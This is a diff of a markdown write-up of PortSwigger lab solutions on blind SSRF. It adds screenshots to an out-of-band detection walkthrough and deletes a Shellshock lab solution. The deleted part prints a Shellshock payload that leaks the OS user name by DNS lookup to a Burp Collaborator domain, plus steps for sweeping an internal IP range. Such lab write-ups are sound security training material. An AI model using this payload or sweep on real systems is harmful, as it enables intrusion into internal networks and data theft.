@@ -176,31 +176,16 @@ To solve the lab, use this functionality to cause an HTTP request to the public 
 ### Sol :
 
 * Visit a product, intercept the request in Burp Suite, and send it to Burp Repeater.
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/7246f155-3dbc-419d-ad96-5bacc025de87)
+
 * Go to the Repeater tab. Select the Referer header, right-click and select "Insert Collaborator Payload" to replace the original domain with a Burp Collaborator generated domain. Send the request.
-* Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/516fa402-cbba-47f3-a09e-fe459cc6923e)
+
+* Go to the Collaborator tab, and click "Poll now".
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/9e05e136-9b10-4b5b-bbb1-8f7a5371f333)
+
 * You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
-
-## Lab 7: Blind SSRF with Shellshock exploitation
-
-This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.
-
-To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the 192.168.0.X range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.
-
-### Sol :
-
-* In `Burp Suite Professional`, install the `Collaborator Everywhere` extension from the BApp Store.
-* Add the domain of the lab to Burp Suite's `target scope`, so that Collaborator Everywhere will target it.
-* Browse the site.
-* Observe that when you load a product page, it triggers an HTTP interaction with Burp Collaborator, via the Referer header.
-* Observe that the HTTP interaction contains your User-Agent string within the HTTP request.
-* Send the request to the product page to Burp Intruder.
-* Go to the `Collaborator` tab and generate a unique Burp Collaborator payload. Place this into the following Shellshock payload:
-
-      () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
-
-* Replace the User-Agent string in the Burp Intruder request with the Shellshock payload containing your Collaborator domain.
-* Click "Clear §", change the Referer header to `http://192.168.0.1:8080` then highlight the final octet of the IP address (the number 1), click "Add §"
-* Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255, and 1 in the "From" and "To" and "Step" boxes respectively.
-* Click "Start attack".
-* When the attack is finished, go back to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously. You should see a DNS interaction that was initiated by the back-end system that was hit by the successful blind SSRF attack. The name of the OS user should appear within the DNS subdomain.
-* To complete the lab, enter the name of the OS user
+* Thus, the lab is solved.
